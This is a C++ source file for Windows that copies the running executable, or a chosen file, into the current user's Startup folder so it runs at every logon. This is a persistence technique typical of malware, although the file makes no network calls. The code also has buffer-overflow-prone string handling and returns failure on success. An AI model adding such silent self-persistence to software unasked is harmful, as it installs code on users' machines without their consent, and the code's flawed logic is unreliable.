#pragma warning(disable:4996)
#include "AutoRun.h"

#define DEBUG 1

BOOL GetStartUpDirPath(char* StartUpDir)
{
    const int MAX_NAME_LENGTH = 0x1000;
    char NameBuffer[MAX_NAME_LENGTH] = { 0 };
    char PathBuffer[MAX_NAME_LENGTH] = "C:\\Users\\";
    DWORD dwBufferLength = MAX_NAME_LENGTH;
    BOOL bFlag = FALSE;

    //SHGetFolderPathA()
    bFlag = GetUserNameA(NameBuffer, &dwBufferLength);
    if (!bFlag)
    {
        if (DEBUG)
        {
            printf("GetUserNameA:%x\n", GetLastError());
        }
        return false;
    }
    //puts(NameBuffer);

    strcat(PathBuffer, NameBuffer);
    strcat(PathBuffer, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
    strcpy(StartUpDir, PathBuffer);

    return true;
}


BOOL AutoRun::StartUpFloderAutoRun(char* szTargetFilePath,const char* szAutoRunFileName)
{
    char szStartUpDirPath[MAX_PATH] = { 0 };
    char szSrcFilePath[MAX_PATH] = { 0 };
    char szDstFilePath[MAX_PATH] = { 0 };
    BOOL bFlag = false;

    bFlag = GetStartUpDirPath(szStartUpDirPath);
    if (!bFlag)
    {
        if (DEBUG)
        {
            printf("GetStartUpDirPath:%x\n", GetLastError());
        }
        return false;
    }
    //puts(szStartUpDirPath);

    strcpy(szDstFilePath, szStartUpDirPath);
    strcat(szDstFilePath, "\\");
    strcat(szDstFilePath, szAutoRunFileName);
    //puts(szDstFilePath);

    if (szTargetFilePath == NULL)
    {
        GetModuleFileNameA(NULL, szSrcFilePath, MAX_PATH);
        //puts(szSrcFilePath);
    }
    else
    {
        strcpy(szSrcFilePath, szTargetFilePath);
    }

    bFlag = CopyFileA(szSrcFilePath, szDstFilePath, TRUE);    //将文件复制到文件夹下
    if (!bFlag)
    {
        DWORD LastError = GetLastError();
        if (LastError == 0x3)
        {
            CreateDirectoryA(szStartUpDirPath,NULL);
            CopyFileA(szSrcFilePath, szDstFilePath, TRUE);
            return true;
        }
        else if (LastError == 0x50)
        {
            return true;
        }
        printf("CopyFile Error %x\n", GetLastError());
        return false;
    }
    return false;
}
